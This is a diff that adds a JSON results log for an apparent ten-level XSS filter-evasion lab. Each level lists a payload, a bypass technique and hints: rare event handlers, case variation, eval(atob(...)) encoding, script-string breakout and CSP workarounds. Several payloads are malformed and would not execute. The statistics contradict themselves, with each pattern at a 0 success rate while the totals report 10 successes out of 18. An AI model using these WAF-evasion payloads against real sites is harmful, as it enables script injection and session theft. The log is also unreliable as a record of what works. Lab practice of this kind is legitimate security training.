@@ -1,0 +1,237 @@
+{
+  "bypasses": [
+    {
+      "level": 1,
+      "challenge": "Basic Script Tag Filter",
+      "payload": "<img.noscript(onerror=\"alert('XSS')\")",
+      "technique": "standard_xss",
+      "context": {
+        "description": "Application blocks <script> tags. Find alternative XSS vectors.",
+        "hints": [
+          "Try event handlers like onerror, onload",
+          "Consider using <img>, <svg>, <iframe> tags",
+          "Event handlers don't need <script> tags"
+        ],
+        "level": 1,
+        "name": "Basic Script Tag Filter"
+      },
+      "timestamp": "2025-12-02T00:47:47.886785"
+    },
+    {
+      "level": 2,
+      "challenge": "Case-Sensitive Event Handler Filter",
+      "payload": "<img.onError(OnLoad(\"XSS\"))",
+      "technique": "case_variation",
+      "context": {
+        "description": "Blocks 'onerror' and 'onload' (lowercase only). Use case variation.",
+        "hints": [
+          "WAFs are often case-sensitive",
+          "Try OnError, OnLoad, ONERROR, etc.",
+          "Mix upper and lower case"
+        ],
+        "level": 2,
+        "name": "Case-Sensitive Event Handler Filter"
+      },
+      "timestamp": "2025-12-02T00:48:05.577337"
+    },
+    {
+      "level": 3,
+      "challenge": "Attribute Pattern Filter",
+      "payload": "<img onerror=\"on error=alert('XSS')\">",
+      "technique": "space_insertion",
+      "context": {
+        "description": "Blocks 'onerror=' pattern. Break it with spaces.",
+        "hints": [
+          "Add space between attribute and equals",
+          "Try: onerror =",
+          "Or: on error="
+        ],
+        "level": 3,
+        "name": "Attribute Pattern Filter"
+      },
+      "timestamp": "2025-12-02T00:48:24.812302"
+    },
+    {
+      "level": 4,
+      "challenge": "Common Event Handler Blacklist",
+      "payload": "<img onmouseover=\"onAnimationEnd=onError(OnLoad(\\\"<script>alert('XSS')</script>\\\"))\">",
+      "technique": "case_variation",
+      "context": {
+        "description": "Blocks onerror, onload, onclick. Find rare event handlers.",
+        "hints": [
+          "Try uncommon handlers: onmouseover, onanimationend",
+          "Consider: ontoggle, onstart, onwheel",
+          "HTML5 has many new event handlers"
+        ],
+        "level": 4,
+        "name": "Common Event Handler Blacklist"
+      },
+      "timestamp": "2025-12-02T00:48:50.909356"
+    },
+    {
+      "level": 5,
+      "challenge": "Tag Blacklist",
+      "payload": "<img onmouseover=\"details.show(); details.innerHTML='<marquee><object data=\\\"<script>alert('XSS')</script>\\\">...</marquee>\\\"\"></img>",
+      "technique": "alternative_event_handler",
+      "context": {
+        "description": "Blocks img, svg, script, iframe tags. Find alternative tags.",
+        "hints": [
+          "Try: <marquee>, <details>, <object>, <embed>",
+          "Consider: <input>, <form>, <body>",
+          "Many HTML tags support event handlers"
+        ],
+        "level": 5,
+        "name": "Tag Blacklist"
+      },
+      "timestamp": "2025-12-02T00:51:54.451916"
+    },
+    {
+      "level": 6,
+      "challenge": "Self-Closing Tag Bypass",
+      "payload": "<svg/onload=\"alert(1)\"><meta http-equiv='refresh' content='0;js:alert('XSS')'>",
+      "technique": "self_closing_tag",
+      "context": {
+        "description": "Filter misses self-closing tags. Use / in tags.",
+        "hints": [
+          "Try: <svg/onload=alert(1)>",
+          "Or: <img/src=x/onerror=alert(1)>",
+          "Self-closing syntax can bypass regex"
+        ],
+        "level": 6,
+        "name": "Self-Closing Tag Bypass"
+      },
+      "timestamp": "2025-12-02T00:52:43.383434"
+    },
+    {
+      "level": 7,
+      "challenge": "String Blacklist (alert blocked)",
+      "payload": "al\\u0065rt(1)",
+      "technique": "encoding",
+      "context": {
+        "description": "The word 'alert' is blocked. Use encoding or alternatives.",
+        "hints": [
+          "Try: alert`1` with backticks",
+          "Or: al\\u0065rt(1) with unicode",
+          "Or: String.fromCharCode(...)",
+          "Or: eval(atob('...'))"
+        ],
+        "level": 7,
+        "name": "String Blacklist (alert blocked)"
+      },
+      "timestamp": "2025-12-02T00:53:08.729492"
+    },
+    {
+      "level": 8,
+      "challenge": "CSP: script-src 'self'",
+      "payload": "<img src=x onerror=location.href='javascript:alert(\"XSS\")'>",
+      "technique": "standard_xss",
+      "context": {
+        "description": "CSP blocks inline scripts. Must use existing scripts or attributes.",
+        "hints": [
+          "Inline <script> won't work due to CSP",
+          "Event handlers still work (not blocked by this CSP)",
+          "Try: <img src=x onerror=location='javascript:alert(1)'>",
+          "Or find existing vulnerable scripts on page"
+        ],
+        "level": 8,
+        "name": "CSP: script-src 'self'"
+      },
+      "timestamp": "2025-12-02T00:53:35.704137"
+    },
+    {
+      "level": 9,
+      "challenge": "JavaScript Context XSS",
+      "payload": "'; alert(1); var x=('",
+      "technique": "context_breakout",
+      "context": {
+        "description": "Input reflected inside <script>var x = 'INPUT';</script>",
+        "hints": [
+          "Close the string and add your code",
+          "Try: '; alert(1); //",
+          "Or: '; alert(1); var x='",
+          "Comment out rest with //"
+        ],
+        "level": 9,
+        "name": "JavaScript Context XSS"
+      },
+      "timestamp": "2025-12-02T00:53:58.556039"
+    },
+    {
+      "level": 10,
+      "challenge": "Advanced WAF Evasion",
+      "payload": "<marquee onstart=eval(atob('YWxlcnQoMSk='))><img src=x onerror=location.href='javascript:alert(\"XSS\")'; var x=('</marquee>",
+      "technique": "alternative_event_handler",
+      "context": {
+        "description": "Multiple protections: tag blacklist, event handler filters, keyword blocking",
+        "hints": [
+          "Combine multiple bypass techniques",
+          "Try: <marquee onstart=eval(atob('YWxlcnQoMSk='))>",
+          "Use encoding + rare handlers + alternative tags",
+          "Think creatively - combine all previous techniques"
+        ],
+        "level": 10,
+        "name": "Advanced WAF Evasion"
+      },
+      "timestamp": "2025-12-02T00:54:25.481551"
+    }
+  ],
+  "patterns": {
+    "standard_xss": {
+      "count": 2,
+      "success_rate": 0,
+      "examples": [
+        "<img.noscript(onerror=\"alert('XSS')\")",
+        "<img src=x onerror=location.href='javascript:alert(\"XSS\")'>"
+      ]
+    },
+    "case_variation": {
+      "count": 2,
+      "success_rate": 0,
+      "examples": [
+        "<img.onError(OnLoad(\"XSS\"))",
+        "<img onmouseover=\"onAnimationEnd=onError(OnLoad(\\\"<script>alert('XSS')</script>\\\"))\">"
+      ]
+    },
+    "space_insertion": {
+      "count": 1,
+      "success_rate": 0,
+      "examples": [
+        "<img onerror=\"on error=alert('XSS')\">"
+      ]
+    },
+    "alternative_event_handler": {
+      "count": 2,
+      "success_rate": 0,
+      "examples": [
+        "<img onmouseover=\"details.show(); details.innerHTML='<marquee><object data=\\\"<script>alert('XSS')</script>\\\">...</marquee>\\\"\"></img>",
+        "<marquee onstart=eval(atob('YWxlcnQoMSk='))><img src=x onerror=location.href='javascript:alert(\"XSS\")'; var x=('</marquee>"
+      ]
+    },
+    "self_closing_tag": {
+      "count": 1,
+      "success_rate": 0,
+      "examples": [
+        "<svg/onload=\"alert(1)\"><meta http-equiv='refresh' content='0;js:alert('XSS')'>"
+      ]
+    },
+    "encoding": {
+      "count": 1,
+      "success_rate": 0,
+      "examples": [
+        "al\\u0065rt(1)"
+      ]
+    },
+    "context_breakout": {
+      "count": 1,
+      "success_rate": 0,
+      "examples": [
+        "'; alert(1); var x=('"
+      ]
+    }
+  },
+  "statistics": {
+    "total_attempts": 18,
+    "total_successes": 10,
+    "success_rate": 0.5555555555555556
+  }
+}
